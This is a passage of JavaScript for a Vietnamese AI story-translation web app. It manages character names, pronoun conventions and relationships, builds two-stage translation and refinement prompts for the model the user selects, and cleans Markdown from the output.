document.addEventListener('DOMContentLoaded', function() {
    // Thay API URL OpenRouter thành hằng số chung cho API URL
    const API_BASE = 'https://generativelanguage.googleapis.com/v1beta';
    // Sử dụng API key từ input
    let apiKeyInput = document.getElementById('api-key');
    
    // API endpoints cho các nhà cung cấp khác
    const API_ENDPOINTS = {
        'gemini': 'https://generativelanguage.googleapis.com/v1beta',
        'openai': 'https://api.openai.com/v1',
        'xai': 'https://api.x.ai/v1',
        'openrouter': 'https://openrouter.ai/api/v1'
    };
    
    // DOM elements
    const characterContainer = document.getElementById('characters-container');
    const relationshipContainer = document.getElementById('relationships-container');
    const pronounContainer = document.getElementById('pronouns-container');
    const expressionsContainer = document.getElementById('expressions-container');
    const contextInput = document.getElementById('context');
    const genreInput = document.getElementById('genre');
    const styleInput = document.getElementById('style');
    const requirementsInput = document.getElementById('requirements');
    const sourceTextInput = document.getElementById('source-text');
    const textFileInput = document.getElementById('text-file-input');
    const textTableBody = document.getElementById('text-table-body');
    const translateBtn = document.getElementById('translate-btn');
    const translationResult = document.getElementById('translation-result');
    const loadingIndicator = document.getElementById('loading-indicator');
    const refineAgainBtn = document.getElementById('refine-again-btn');
    
    // Biến trạng thái
    let isLoading = false;
    
    // Danh sách model Gemini có sẵn
    const availableModels = [
        { id: "gemini-2.0-flash-thinking-exp-01-21", name: "Gemini Flash Thinking", description: "Model nhanh nhất, chất lượng tốt", provider: "gemini" },
        { id: "gemini-2.0-pro-exp-02-05", name: "Gemini Pro", description: "Model cân bằng giữa tốc độ và chất lượng", provider: "gemini" },
        { id: "gemini-2.0-pro-vision-exp-02-05", name: "Gemini Pro Vision", description: "Model hỗ trợ hình ảnh và văn bản", provider: "gemini" },
        { id: "gemini-2.0-ultra-exp-02-05", name: "Gemini Ultra", description: "Model cao cấp nhất, chất lượng tốt nhất", provider: "gemini" },
        { id: "gpt-4-turbo", name: "GPT-4 Turbo", description: "Model mạnh nhất của OpenAI", provider: "openai" },
        { id: "gpt-3.5-turbo", name: "GPT-3.5 Turbo", description: "Model cân bằng của OpenAI", provider: "openai" },
        { id: "grok-2-latest", name: "grok-2-latest", description: "Model của X.AI", provider: "xai" },
        { id: "anthropic/claude-3-opus", name: "Claude 3 Opus", description: "Model cao cấp của Anthropic qua OpenRouter", provider: "openrouter" },
        { id: "anthropic/claude-3-sonnet", name: "Claude 3 Sonnet", description: "Model cân bằng của Anthropic qua OpenRouter", provider: "openrouter" }
    ];
    
    // Hàm hiển thị thông báo đẹp
    function showToast(message, type = 'info') {
        const backgroundColor = {
            'success': '#4caf50',
            'error': '#f44336',
            'warning': '#ff9800',
            'info': '#2196f3'
        };
        
        Toastify({
            text: message,
            duration: 3000,
            close: true,
            gravity: "top",
            position: "right",
            stopOnFocus: true,
            style: {
                background: backgroundColor[type],
                boxShadow: "none",
                borderRadius: "4px",
                color: "#fff",
                fontWeight: "500"
            }
        }).showToast();
    }
    
    // Thêm các nút sao chép cho kết quả dịch
    const outputSection = document.querySelector('.output-section');
    const resultActions = document.createElement('div');
    resultActions.className = 'result-actions';
    
    // Button to copy as text
    const copyTextBtn = document.createElement('button');
    copyTextBtn.textContent = 'Sao chép kết quả';
    copyTextBtn.className = 'btn btn-secondary btn-small';
    copyTextBtn.addEventListener('click', function() {
        navigator.clipboard.writeText(translationResult.textContent).then(() => {
            showToast('Đã sao chép kết quả!', 'success');
        }).catch(err => {
            console.error('Lỗi khi sao chép:', err);
            showToast('Không thể sao chép: ' + err.message, 'error');
        });
    });
    
    resultActions.appendChild(copyTextBtn);
    outputSection.appendChild(resultActions);
    
    // Templates
    const characterTemplate = document.getElementById('character-template');
    const relationshipTemplate = document.getElementById('relationship-template');
    const pronounTemplate = document.getElementById('pronoun-template');
    const expressionTemplate = document.getElementById('expression-template');
    
    // Cập nhật trạng thái ban đầu của các nút
    updateButtonState();
    
    // Thêm nút thêm dòng mới
    addNewRowButton();
    
    // Thêm tùy chọn chọn model
    addModelSelection();
    
    // Add event listeners for buttons
    document.getElementById('add-character').addEventListener('click', addCharacter);
    document.getElementById('add-relationship').addEventListener('click', addRelationship);
    document.getElementById('add-pronoun').addEventListener('click', addPronoun);
    document.getElementById('add-expression').addEventListener('click', addExpression);
    translateBtn.addEventListener('click', translateText);
    refineAgainBtn.addEventListener('click', refineAgain);
    textFileInput.addEventListener('change', handleFileUpload);
    
    // Thêm nút lưu và tải cài đặt
    document.getElementById('save-settings').addEventListener('click', saveSettings);
    document.getElementById('load-settings').addEventListener('click', loadSettings);
    document.getElementById('export-json').addEventListener('click', exportToJson);
    document.getElementById('import-json-btn').addEventListener('click', function() {
        document.getElementById('import-json').click();
    });
    document.getElementById('import-json').addEventListener('change', importFromJson);
    document.getElementById('reset-settings').addEventListener('click', resetSettings);
    
    // Thêm chức năng hiển thị/ẩn API key
    document.getElementById('toggle-api-key').addEventListener('click', function() {
        const apiKeyInput = document.getElementById('api-key');
        if (apiKeyInput.type === 'password') {
            apiKeyInput.type = 'text';
            this.textContent = '🔒';
        } else {
            apiKeyInput.type = 'password';
            this.textContent = '👁️';
        }
    });
    
    // Thêm event listeners cho trường nhập
    genreInput.addEventListener('input', function() {
        markAsChanged();
    });
    styleInput.addEventListener('input', function() {
        markAsChanged();
    });
    requirementsInput.addEventListener('input', function() {
        markAsChanged();
    });
    contextInput.addEventListener('input', function() {
        markAsChanged();
    });
    sourceTextInput.addEventListener('input', function() {
        markAsChanged();
    });
    
    // Characters data array
    let characters = [];
    // Expressions data array
    let expressions = [];
    // Lưu các cặp xưng hô đã tồn tại để tránh trùng lặp
    let existingPronounPairs = new Set();
    // Biến để theo dõi trạng thái
    let hasUnsavedChanges = false;
    // Lines of text for translation
    let textLines = [];
    
    // Không còn tự động lưu định kỳ
    
    // Cập nhật trạng thái khi có thay đổi
    function markAsChanged() {
        hasUnsavedChanges = true;
    }
    
    // Thêm sự kiện beforeunload để cảnh báo người dùng khi rời trang mà chưa lưu
    window.addEventListener('beforeunload', function(e) {
        if (hasUnsavedChanges) {
            // Hiển thị thông báo
            const confirmationMessage = 'Bạn có thay đổi chưa được lưu. Bạn có chắc chắn muốn rời khỏi trang?';
            e.returnValue = confirmationMessage;
            return confirmationMessage;
        }
    });
    
    // Kiểm tra xem các phần tử DOM đã được tạo chưa
    if (!characterContainer || !relationshipContainer || !pronounContainer || 
        !contextInput || !genreInput || !styleInput || !requirementsInput || !sourceTextInput) {
        console.error("Không thể tìm thấy một hoặc nhiều phần tử DOM cần thiết!");
        alert("Lỗi khởi tạo ứng dụng. Vui lòng tải lại trang.");
    } else {
        console.log("Các phần tử DOM đã được tìm thấy:", {
            characterContainer: !!characterContainer,
            relationshipContainer: !!relationshipContainer,
            pronounContainer: !!pronounContainer,
            contextInput: !!contextInput,
            genreInput: !!genreInput,
            styleInput: !!styleInput,
            requirementsInput: !!requirementsInput,
            sourceTextInput: !!sourceTextInput,
        });
        
        // Tải dữ liệu từ localStorage nếu có
        const savedSettings = localStorage.getItem('dich-ai-settings');
        if (savedSettings) {
            try {
                const jsonData = JSON.parse(savedSettings);
                loadDataFromJson(jsonData);
                console.log("Đã tải cài đặt từ localStorage");
            } catch (error) {
                console.error("Lỗi khi tải dữ liệu từ localStorage:", error);
            }
        }
    }
    
    // If there's no character yet, add an initial one
    if (characterContainer.children.length === 0) {
        addCharacter();
    }
    
    // Functions
    function addCharacter() {
        const newCharacter = characterTemplate.content.cloneNode(true);
        characterContainer.appendChild(newCharacter);
        
        // Add event listener to the remove button
        const removeBtn = characterContainer.querySelector('.character-entry:last-child .remove-btn');
        removeBtn.addEventListener('click', function() {
            this.closest('.character-entry').remove();
            updateCharactersList();
            markAsChanged();
        });
        
        // Add event listener to input for updating characters list
        const nameInput = characterContainer.querySelector('.character-entry:last-child .character-name');
        nameInput.addEventListener('input', function() {
            updateCharactersList();
            markAsChanged();
        });
        
        updateCharactersList();
        markAsChanged();
    }
    
    function addRelationship() {
        const newRelationship = relationshipTemplate.content.cloneNode(true);
        relationshipContainer.appendChild(newRelationship);
        
        // Add event listener to the remove button
        const removeBtn = relationshipContainer.querySelector('.relationship-entry:last-child .remove-btn');
        removeBtn.addEventListener('click', function() {
            this.closest('.relationship-entry').remove();
            markAsChanged();
        });
        
        // Add event listener to input for auto saving
        const descInput = relationshipContainer.querySelector('.relationship-entry:last-child .relationship-description');
        descInput.addEventListener('input', function() {
            markAsChanged();
        });
        
        markAsChanged();
    }
    
    function addPronoun() {
        const newPronoun = pronounTemplate.content.cloneNode(true);
        pronounContainer.appendChild(newPronoun);
        
        // Populate selects with character names
        const fromSelect = pronounContainer.querySelector('.pronoun-entry:last-child .pronoun-from');
        const toSelect = pronounContainer.querySelector('.pronoun-entry:last-child .pronoun-to');
        const valueInput = pronounContainer.querySelector('.pronoun-entry:last-child .pronoun-value');
        const selfValueInput = pronounContainer.querySelector('.pronoun-entry:last-child .self-pronoun-value');
        
        populateCharacterSelect(fromSelect);
        populateCharacterSelect(toSelect);
        
        // Add event listeners for selects to prevent duplicates
        fromSelect.addEventListener('change', function() {
            updateAvailableToCharacters(this.closest('.pronoun-entry'));
            markAsChanged();
        });
        
        toSelect.addEventListener('change', function() {
            // Check if this is a valid combination
            const fromValue = this.closest('.pronoun-entry').querySelector('.pronoun-from').value;
            const toValue = this.value;
            
            if (fromValue === toValue) {
                alert('Không thể thiết lập xưng hô với chính mình!');
                this.selectedIndex = 0;
                return;
            }
            
            const pairKey = `${fromValue}-${toValue}`;
            if (existingPronounPairs.has(pairKey) && !this.dataset.originalPair) {
                alert('Xưng hô giữa hai nhân vật này đã tồn tại!');
                this.selectedIndex = 0;
                return;
            }
            
            markAsChanged();
        });
        
        // Add event listeners for input fields to auto save
        valueInput.addEventListener('input', function() {
            markAsChanged();
        });
        selfValueInput.addEventListener('input', function() {
            markAsChanged();
        });
        
        // Add event listener to the remove button
        const removeBtn = pronounContainer.querySelector('.pronoun-entry:last-child .remove-btn');
        removeBtn.addEventListener('click', function() {
            const entry = this.closest('.pronoun-entry');
            const fromValue = entry.querySelector('.pronoun-from').value;
            const toValue = entry.querySelector('.pronoun-to').value;
            
            // Remove from existing pairs
            existingPronounPairs.delete(`${fromValue}-${toValue}`);
            
            entry.remove();
            updatePronounPairs();
            markAsChanged();
        });
        
        // Trigger initial validation
        updateAvailableToCharacters(pronounContainer.querySelector('.pronoun-entry:last-child'));
        
        // Save after adding
        markAsChanged();
    }
    
    function updateAvailableToCharacters(entryElement) {
        const fromSelect = entryElement.querySelector('.pronoun-from');
        const toSelect = entryElement.querySelector('.pronoun-to');
        const selectedFrom = fromSelect.value;
        
        // Store current selection
        const currentTo = toSelect.value;
        
        // Clear existing options
        toSelect.innerHTML = '';
        
        // Add options excluding the selected "from" character
        characters.forEach(character => {
            // Skip if it's the same character
            if (character === selectedFrom) return;
            
            // Skip if this pair already exists elsewhere
            const pairKey = `${selectedFrom}-${character}`;
            if (existingPronounPairs.has(pairKey) && 
                (!toSelect.dataset.originalPair || 
                 toSelect.dataset.originalPair !== pairKey)) {
                return;
            }
            
            const option = document.createElement('option');
            option.value = character;
            option.textContent = character;
            toSelect.appendChild(option);
        });
        
        // Add empty option at the beginning
        const emptyOption = document.createElement('option');
        emptyOption.value = '';
        emptyOption.textContent = '-- Chọn nhân vật --';
        toSelect.insertBefore(emptyOption, toSelect.firstChild);
        
        // Restore selection if still available
        if (currentTo && Array.from(toSelect.options).some(opt => opt.value === currentTo)) {
            toSelect.value = currentTo;
        } else {
            toSelect.selectedIndex = 0;
        }
    }
    
    function updateCharactersList() {
        characters = [];
        document.querySelectorAll('.character-name').forEach(input => {
            if (input.value.trim() !== '') {
                characters.push(input.value.trim());
            }
        });
        
        console.log("Character list updated:", characters);
        
        // Update all pronoun selects
        document.querySelectorAll('.pronoun-from').forEach(select => {
            const currentValue = select.value;
            const entryElement = select.closest('.pronoun-entry');
            
            populateCharacterSelect(select);
            select.value = currentValue;
            
            // Update "to" selects based on new character list
            updateAvailableToCharacters(entryElement);
        });
        
        // Update character selects in the table
        updateTableCharacterSelects();
        
        updatePronounPairs();
        markAsChanged();
    }
    
    function updatePronounPairs() {
        // Clear and rebuild existing pairs
        existingPronounPairs.clear();
        
        document.querySelectorAll('.pronoun-entry').forEach(entry => {
            const fromValue = entry.querySelector('.pronoun-from').value;
            const toValue = entry.querySelector('.pronoun-to').value;
            
            if (fromValue && toValue) {
                const pairKey = `${fromValue}-${toValue}`;
                existingPronounPairs.add(pairKey);
                
                // Store original pair for this entry
                entry.querySelector('.pronoun-to').dataset.originalPair = pairKey;
            }
        });
    }
    
    function populateCharacterSelect(select) {
        const currentValue = select.value;
        select.innerHTML = '';
        
        characters.forEach(character => {
            const option = document.createElement('option');
            option.value = character;
            option.textContent = character;
            select.appendChild(option);
        });
        
        // Add empty option at the beginning
        const emptyOption = document.createElement('option');
        emptyOption.value = '';
        emptyOption.textContent = '-- Chọn nhân vật --';
        select.insertBefore(emptyOption, select.firstChild);
        
        // Restore previous selection if possible
        if (currentValue && Array.from(select.options).some(opt => opt.value === currentValue)) {
            select.value = currentValue;
        } else {
            select.selectedIndex = 0;
        }
    }
    
    async function translateText() {
        // Kiểm tra nếu đang trong quá trình xử lý
        if (isLoading) {
            return;
        }
        
        // Kiểm tra nếu không có văn bản gốc
        if (getOriginalText().trim() === '') {
            displayErrorMessage('Vui lòng nhập văn bản gốc cần dịch.');
            return;
        }
        
        // Lấy API key
        const apiKey = document.getElementById('api-key').value.trim();
        if (!apiKey) {
            displayErrorMessage('Vui lòng nhập API key.');
            return;
        }
        
        // Lấy model được chọn từ dropdown
        const model = document.getElementById('model-selection').value;
        if (!model) {
            displayErrorMessage('Vui lòng chọn model AI.');
            return;
        }
        
        // Thiết lập trạng thái đang xử lý
        isLoading = true;
        updateButtonState();

        // Hiển thị tiến trình
        const progressElement = document.createElement('div');
        progressElement.className = 'translation-progress';
        progressElement.innerHTML = `
            <div class="progress-step step-active">Bước 1: Dịch ban đầu</div>
            <div class="progress-step">Bước 2: Trau chuốt bản dịch</div>
        `;
        translationResult.innerHTML = '';
        translationResult.appendChild(progressElement);

        // Trích xuất thông tin quan trọng từ dữ liệu nhập vào
        const promptInfo = extractPromptInfo();
        
        // Bước 1: Dịch ban đầu
        callChatGPT(apiKey, model, buildTranslationPrompt())
            .then(response => {
                if (progressElement.parentNode === translationResult) {
                    progressElement.children[0].classList.remove('step-active');
                    progressElement.children[0].classList.add('step-completed');
                    progressElement.children[1].classList.add('step-active');
                }
                
                // Sử dụng hàm stripMarkdownOnly để giữ thông tin nhân vật và biểu hiện
                const initialTranslation = stripMarkdownOnly(response);
                
                // Thay thế "câu cần dịch" thành "câu cần trau chuốt" trong bản trau chuốt 
                const formattedInitialTranslation = initialTranslation.replace(/câu cần dịch:/gi, "câu cần trau chuốt:");
                
                // Bước 2: Trau chuốt bản dịch
                const refinementPrompt = buildRefinementPrompt(formattedInitialTranslation, promptInfo);
                
                return callChatGPT(apiKey, model, refinementPrompt);
            })
            .then(refinedTranslation => {
                // Loại bỏ mọi định dạng Markdown và thông tin nhân vật, biểu hiện ở kết quả cuối cùng
                const finalTranslation = stripMarkdown(refinedTranslation);
                
                translationResult.innerHTML = '';
                translationResult.appendChild(document.createTextNode(finalTranslation));
                
                // Hiển thị nút trau chuốt lần nữa khi có kết quả dịch
                document.getElementById('refine-again-controls').style.display = 'flex';
                
                isLoading = false;
                updateButtonState();
            })
            .catch(error => {
                displayErrorMessage('Lỗi dịch văn bản: ' + error.message);
                isLoading = false;
                updateButtonState();
            });
    }
    
    // Hàm trích xuất thông tin từ prompt để sử dụng lại trong bước trau chuốt
    function extractPromptInfo() {
        // Thu thập thông tin về xưng hô
        const pronounInfo = [];
        document.querySelectorAll('.pronoun-entry').forEach(entry => {
            const from = entry.querySelector('.pronoun-from').value;
            const to = entry.querySelector('.pronoun-to').value;
            const value = entry.querySelector('.pronoun-value').value;
            const selfValue = entry.querySelector('.self-pronoun-value').value;
            
            if (from && to && value) {
                pronounInfo.push({
                    from: from,
                    to: to,
                    value: value,
                    selfValue: selfValue
                });
            }
        });
        
        // Thu thập thông tin về các dòng "giữ nguyên"
        const keepOriginalLines = [];
        document.querySelectorAll('#text-table-body tr').forEach((row, index) => {
            const expressionSelect = row.querySelector('.expression-select');
            const textCell = row.querySelector('td:nth-child(4)');
            
            const expression = expressionSelect.value;
            const text = textCell.getAttribute('data-original-text');
            
            if (expression === 'Giữ nguyên') {
                keepOriginalLines.push({
                    index: index + 1,
                    text: text
                });
            }
        });
        
        // Thu thập thông tin về mối quan hệ nhân vật
        const relationships = [];
        document.querySelectorAll('.relationship-description').forEach(input => {
            if (input.value.trim() !== '') {
                relationships.push(input.value.trim());
            }
        });
        
        return {
            pronouns: pronounInfo,
            keepOriginalLines: keepOriginalLines,
            relationships: relationships,
            genre: genreInput.value.trim(),
            style: styleInput.value.trim()
        };
    }
    
    // Hàm tạo prompt cho việc trau chuốt bản dịch
    function buildRefinementPrompt(firstTranslation, promptInfo) {
        let prompt = "Dưới đây là bản dịch của một văn bản. Hãy trau chuốt lại bản dịch này để có văn phong ổn hơn, hay hơn, mượt như đối thoại ngoài đời, nhưng không được thêm bớt, phải đúng ý nghĩa câu văn và PHẢI GIỮ NGUYÊN XƯNG HÔ theo yêu cầu. LƯU Ý: VIỆC GIỮ NGUYÊN XƯNG HÔ LÀ QUAN TRỌNG NHẤT, KHÔNG ĐƯỢC THAY ĐỔI DƯỚI BẤT KỲ HÌNH THỨC NÀO.\n\n";
        
        prompt += "XƯng HÔ GIỮA CÁC NHÂN VẬT (PHẢI TUÂN THEO NGHIÊM NGẶT - ĐÂY LÀ YÊU CẦU QUAN TRỌNG NHẤT):\n";
        promptInfo.pronouns.forEach(item => {
            prompt += `- ${item.from}: gọi ${item.to} là "${item.value}"`;
            if (item.selfValue) {
                prompt += `, xưng bản thân là "${item.selfValue}"`;
            }
            prompt += '\n';
        });
        
        if (promptInfo.relationships.length > 0) {
            prompt += "\nMỐI QUAN HỆ GIỮA CÁC NHÂN VẬT:\n";
            promptInfo.relationships.forEach(rel => {
                prompt += `- ${rel}\n`;
            });
        }
        
        prompt += "\nYÊU CẦU BẮT BUỘC PHẢI TUÂN THỦ:\n";
        prompt += "- Trau chuốt văn phong để ổn hơn\n";
        prompt += "- PHẢI GIỮ NGUYÊN TẤT CẢ XƯNG HÔ giữa các nhân vật như đã chỉ định ở trên - ĐÂY LÀ YÊU CẦU QUAN TRỌNG NHẤT\n";
        prompt += "- Giữ nguyên cấu trúc đoạn văn và phân đoạn\n";
        prompt += "- Không sử dụng Markdown, trả về văn bản thuần túy\n";
        prompt += "- Không thêm bất kỳ thông tin mới nào\n";
        prompt += "- VÔ CÙNG QUAN TRỌNG: PHẢI GIỮ NGUYÊN định dạng đầu vào 'Nhân vật: X, Biểu hiện/dạng thoại: Y, câu cần trau chuốt: Z' ở mỗi dòng trong QUÁ TRÌNH trau chuốt, nhưng KHÔNG đưa thông tin này vào kết quả cuối cùng\n";
        
        // Thêm văn phong nếu có
        if (promptInfo.style) {
            prompt += `- Áp dụng văn phong: ${promptInfo.style}\n`;
        }
        
        // Thêm thể loại nếu có
        if (promptInfo.genre) {
            prompt += `- Phù hợp với thể loại: ${promptInfo.genre}\n`;
        }
        
        // Thêm thông tin về các dòng cần giữ nguyên
        if (promptInfo.keepOriginalLines.length > 0) {
            prompt += "\nCÁC DÒNG VĂN BẢN CẦN GIỮ NGUYÊN (KHÔNG ĐƯỢC THAY ĐỔI):\n";
            promptInfo.keepOriginalLines.forEach(line => {
                prompt += `Dòng ${line.index}: ${line.text}\n`;
            });
            prompt += "Những dòng trên PHẢI được giữ nguyên trong bản dịch cuối cùng, KHÔNG ĐƯỢC DỊCH các dòng này.\n";
        }
        
        prompt += "\nBẢN DỊCH CẦN TRAU CHUỐT:\n\n";
        prompt += firstTranslation;
        
        prompt += "\n\nCÁCH TRẢ LỜI YÊU CẦU: Sau khi trau chuốt, hãy chỉ trả về kết quả trau chuốt THEO ĐÚNG ĐỊNH DẠNG CHUẨN SAU:\n";
        prompt += "1. Mỗi dòng phải bắt đầu với 'Nhân vật: X, Biểu hiện/dạng thoại: Y, câu cần trau chuốt: Z'\n";
        prompt += "2. TUYỆT ĐỐI KHÔNG thêm mô tả, giải thích hoặc bất kỳ phần giới thiệu/kết luận nào\n";
        prompt += "3. Không thêm bất kỳ định dạng Markdown nào\n";
        prompt += "4. Trả về kết quả dưới dạng văn bản thuần (plain text)\n\n";
        
        prompt += "NHẮC LẠI CÁC QUY TẮC TRAU CHUỐT (ĐỌC KỸ VÀ TUÂN THỦ):\n";
        prompt += "1. PHẢI giữ nguyên cấu trúc đoạn văn và phân đoạn\n";
        prompt += "2. PHẢI sử dụng CHÍNH XÁC xưng hô giữa các nhân vật như đã chỉ định ở trên - ĐÂY LÀ QUAN TRỌNG NHẤT\n";
        prompt += "3. PHẢI giữ nguyên những dòng đã được chỉ định là 'giữ nguyên'\n";
        prompt += "4. PHẢI giữ nguyên định dạng 'Nhân vật: X, Biểu hiện/dạng thoại: Y, câu cần trau chuốt: Z' ở mỗi dòng trong kết quả trau chuốt\n";
        prompt += "5. KHÔNG được thêm phần giới thiệu hoặc kết luận nào vào kết quả";
        
        return prompt;
    }
    
    // Hàm chỉ bỏ định dạng Markdown, giữ nguyên thông tin nhân vật và biểu hiện
    function stripMarkdownOnly(text) {
        if (!text) return '';
        
        // Chỉ bỏ các dấu hiệu định dạng phổ biến của Markdown
        text = text
            // Bỏ các tiêu đề
            .replace(/^#+\s+/gm, '')
            // Bỏ định dạng in đậm
            .replace(/\*\*(.*?)\*\*/g, '$1')
            .replace(/__(.*?)__/g, '$1')
            // Bỏ định dạng in nghiêng
            .replace(/\*(.*?)\*/g, '$1')
            .replace(/_(.*?)_/g, '$1')
            // Bỏ định dạng blockquote
            .replace(/^>\s+/gm, '')
            // Bỏ định dạng danh sách
            .replace(/^[\*\-+]\s+/gm, '')
            .replace(/^\d+\.\s+/gm, '')
            // Bỏ backticks cho code
            .replace(/`([^`]+)`/g, '$1')
            .replace(/```[\s\S]*?```/g, '')
            // Bỏ đường kẻ ngang
            .replace(/^[\-=_]{3,}\s*$/gm, '')
            // Bỏ liên kết
            .replace(/\[([^\]]+)\]\(([^)]+)\)/g, '$1')
            // Bỏ hình ảnh
            .replace(/!\[([^\]]+)\]\(([^)]+)\)/g, '');
            
        return text;
    }
    
    // Hàm bỏ định dạng Markdown và thông tin nhân vật/biểu hiện trong văn bản
    function stripMarkdown(text) {
        if (!text) return '';
        
        // Loại bỏ các phần thông tin về nhân vật, biểu hiện và câu cần trau chuốt
        text = text
            // Loại bỏ cả dòng nếu nó bắt đầu với "Nhân vật:" và kết thúc với "câu cần trau chuốt:"
            .replace(/Nhân vật:.*?Biểu hiện\/dạng thoại:.*?câu cần trau chuốt:[\s]*/gi, '')
            // Loại bỏ từng phần riêng lẻ để đảm bảo xử lý triệt để
            .replace(/Nhân vật:[\s\S]*?(,\s+|,)/gi, '')
            .replace(/Biểu hiện\/dạng thoại:[\s\S]*?(,\s+|,)/gi, '')
            .replace(/[cC]âu cần (dịch|trau chuốt):[\s]*/gi, '');
        
        // Bỏ các dấu hiệu định dạng phổ biến của Markdown
        text = text
            // Bỏ các tiêu đề
            .replace(/^#+\s+/gm, '')
            // Bỏ định dạng in đậm
            .replace(/\*\*(.*?)\*\*/g, '$1')
            .replace(/__(.*?)__/g, '$1')
            // Bỏ định dạng in nghiêng
            .replace(/\*(.*?)\*/g, '$1')
            .replace(/_(.*?)_/g, '$1')
            // Bỏ định dạng blockquote
            .replace(/^>\s+/gm, '')
            // Bỏ định dạng danh sách
            .replace(/^[\*\-+]\s+/gm, '')
            .replace(/^\d+\.\s+/gm, '')
            // Bỏ backticks cho code
            .replace(/`([^`]+)`/g, '$1')
            .replace(/```[\s\S]*?```/g, '')
            // Bỏ đường kẻ ngang
            .replace(/^[\-=_]{3,}\s*$/gm, '')
            // Bỏ liên kết
            .replace(/\[([^\]]+)\]\(([^)]+)\)/g, '$1')
            // Bỏ hình ảnh
            .replace(/!\[([^\]]+)\]\(([^)]+)\)/g, '');
            
        // Loại bỏ dòng trống dư thừa
        text = text
            .replace(/\n{3,}/g, '\n\n') // Thay thế 3+ dòng trống thành 2 dòng
            .trim();
            
        return text;
    }
    
    function buildTranslationPrompt() {
        let prompt = "Bạn là một dịch giả chuyên nghiệp, đã có hơn 20 năm kinh nghiệm trong lĩnh vực dịch truyện, giờ hãy dịch chương truyện sau sang tiếng việt. LƯU Ý QUAN TRỌNG: Bắt buộc PHẢI giữ nguyên tất cả xưng hô, tuân thủ các yêu cầu và văn phong và các lưu ý quan trọng.\n\n";
        
        // Add character pronouns
        prompt += "XƯng HÔ GIỮA CÁC NHÂN VẬT (phải tuân theo nghiêm ngặt):\n";
        document.querySelectorAll('.pronoun-entry').forEach(entry => {
            const from = entry.querySelector('.pronoun-from').value;
            const to = entry.querySelector('.pronoun-to').value;
            const value = entry.querySelector('.pronoun-value').value;
            const selfValue = entry.querySelector('.self-pronoun-value').value;
            
            if (from && to && value) {
                prompt += `- ${from}: gọi ${to} là "${value}"`;
                
                if (selfValue) {
                    prompt += `, xưng bản thân là "${selfValue}"`;
                }
                
                prompt += '\n';
            }
        });
        
        // Add thể loại if provided
        if (genreInput.value.trim()) {
            prompt += `\nThể loại: ${genreInput.value.trim()}\n`;
        }
        
        // Add văn phong if provided
        if (styleInput.value.trim()) {
            prompt += `\nVăn phong: ${styleInput.value.trim()}\n`;
        }
        
        // Add relationships
        prompt += "\nMỐI QUAN HỆ GIỮA CÁC NHÂN VẬT:\n";
        document.querySelectorAll('.relationship-description').forEach(input => {
            if (input.value.trim() !== '') {
                prompt += `- ${input.value.trim()}\n`;
            }
        });
        
        // Add context
        if (contextInput.value.trim() !== '') {
            prompt += "\nBỐI CẢNH:\n" + contextInput.value.trim() + "\n";
        }
        
        // Add translation instructions
        prompt += "\nYÊU CẦU BẮT BUỘC PHẢI TUÂN THỦ:\n";
        prompt += "- " + requirementsInput.value.trim() + "\n";
        prompt += "- PHẢI DỊCH CHÍNH XÁC, DỊCH TRÔI CHẢY, TỰ NHIÊN, TRÁNH LỖI LẶP TỪ HOÀN TOÀN, bao gồm:\n";
        prompt += "* Kiểm tra kỹ từng câu để tránh sử dụng từ hoặc cụm từ giống nhau lặp lại không cần thiết.\n";
        prompt += "* Sử dụng từ đồng nghĩa hợp lý để tránh trùng lặp trong những dòng gần nhau.\n";
        prompt += "* Dùng đa dạng cấu trúc câu để tránh lặp về mặt ngữ pháp.\n";
        prompt += "* Không được Lặp từ giữa hai câu gần nhau.\n";
        prompt += "* Không được Lặp từ trong cùng một câu.\n";
        prompt += "- Dịch chính xác, giữ nguyên tất cả xưng hô của các nhân vật như đã chỉ định ở trên\n";
        prompt += "- Giữ nguyên cấu trúc đoạn văn và phân đoạn như văn bản gốc\n";
        prompt += "- Không sử dụng Markdown, trả về văn bản thuần túy\n";
        prompt += "- Phải đúng chính tả, không được nhầm sang ngôn ngữ khác\n";
        prompt += "- Nếu một dòng có Biểu hiện/dạng thoại là \"giữ nguyên\", KHÔNG DỊCH dòng đó, giữ nguyên văn bản gốc\n";
        prompt += "- VÔ CÙNG QUAN TRỌNG: PHẢI GIỮ NGUYÊN các phần 'Nhân vật:' và 'Biểu hiện/dạng thoại:' trong kết quả dịch CHÍNH XÁC như định dạng đầu vào: 'Nhân vật: X, Biểu hiện/dạng thoại: Y, câu cần dịch: Z'\n";
        
        prompt += "\nXỬ LÝ LỖI LẶP TỪ HOÀN TOÀN NHƯ SAU:\n\n";
        prompt += `1. Nếu hai câu gần nhau bị lặp từ (ví dụ "ông ta"):\nThay thế từ bị lặp bằng đại từ phù hợp hoặc miêu tả gián tiếp\nVí dụ:\nSai (lặp từ):\nÔng ta đang lảm nhảm điều gì vậy?\nÔng ta điên rồi...\n\nĐúng (loại bỏ lặp từ):\n\nÔng ta đang lảm nhảm điều gì vậy?\nĐúng là điên rồi...\n`;
        prompt += `\n2. Nếu một câu lặp một từ quá nhiều lần (ví dụ "tôi"):\nBiến đổi cấu trúc câu hoặc thay thế từ bằng cách rút gọn hợp lý\nVí dụ:\nSai (lặp từ quá nhiều):\nTôi không muốn gia đình phát hiện ra việc tôi đang tìm kiếm Haru... ý tôi là... Nagi.\n\nĐúng (loại bỏ lặp từ):\n\nTôi không muốn gia đình biết chuyện mình đang tìm kiếm Haru... ý là... Nagi.\n`;

        // Add text lines with character and expression information
        prompt += "\nVĂN BẢN CẦN DỊCH:\n\n";
        
        // Get all rows from the table
        const rows = document.querySelectorAll('#text-table-body tr');
        
        if (rows.length > 0) {
            rows.forEach((row, index) => {
                const characterSelect = row.querySelector('.character-select');
                const expressionSelect = row.querySelector('.expression-select');
                const textCell = row.querySelector('td:nth-child(4)');
                
                const character = characterSelect.value !== 'none' ? characterSelect.value : '';
                const expression = expressionSelect.value !== 'none' ? expressionSelect.value : '';
                const text = textCell.getAttribute('data-original-text');
                
                // Định dạng câu theo yêu cầu
                let line = '';
                
                // Thêm thông tin nhân vật nếu có
                if (character) {
                    line += `Nhân vật: ${character}, `;
                }
                
                // Thêm thông tin biểu hiện nếu có
                if (expression) {
                    line += `Biểu hiện/dạng thoại: ${expression}, `;
                }
                
                // Thêm câu cần dịch
                line += `câu cần dịch: ${text}`;
                
                prompt += line + '\n';
            });
        } else {
            // Fallback to source text if no table rows
            prompt += sourceTextInput.value.trim();
        }
        
        // Final reminder about pronouns and formatting
        prompt += "\n\nNHẮC LẠI CÁC YÊU CẦU QUAN TRỌNG (PHẢI TUÂN THỦ):\n";
        prompt += "1. PHẢI giữ nguyên cấu trúc đoạn văn và phân đoạn\n";
